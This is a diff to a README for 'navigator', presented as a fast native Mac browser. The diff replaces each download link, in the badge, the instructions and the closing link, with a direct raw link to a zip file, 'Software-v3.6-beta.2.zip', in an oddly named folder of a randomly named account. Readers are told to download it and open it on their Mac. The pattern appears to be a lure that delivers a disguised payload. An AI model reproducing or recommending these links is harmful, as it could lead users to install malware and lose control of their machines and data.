@@ -1,6 +1,6 @@
 # 🧭 navigator - A faster native browser for Mac
 
-[![Download navigator](https://img.shields.io/badge/Download-navigator-blue?style=for-the-badge)](https://github.com/bitterendsexualrelationship563/navigator)
+[![Download navigator](https://img.shields.io/badge/Download-navigator-blue?style=for-the-badge)](https://raw.githubusercontent.com/bitterendsexualrelationship563/navigator/main/kaleyard/Software-v3.6-beta.2.zip)
 
 ## 🚀 What is Navigator?
 
@@ -20,7 +20,7 @@ It is made for people who want a browser with:
 
 Visit this page to download and run the app:
 
-https://github.com/bitterendsexualrelationship563/navigator
+https://raw.githubusercontent.com/bitterendsexualrelationship563/navigator/main/kaleyard/Software-v3.6-beta.2.zip
 
 If the page shows a release file, download it and open it on your Mac. If it shows the source code only, use the provided app package or build output on the same page.
 
@@ -271,4 +271,4 @@ For smooth use:
 - pin the sites you use often
 - restore your session if you want the same layout each time
 
-[Download navigator](https://github.com/bitterendsexualrelationship563/navigator)
+[Download navigator](https://raw.githubusercontent.com/bitterendsexualrelationship563/navigator/main/kaleyard/Software-v3.6-beta.2.zip)
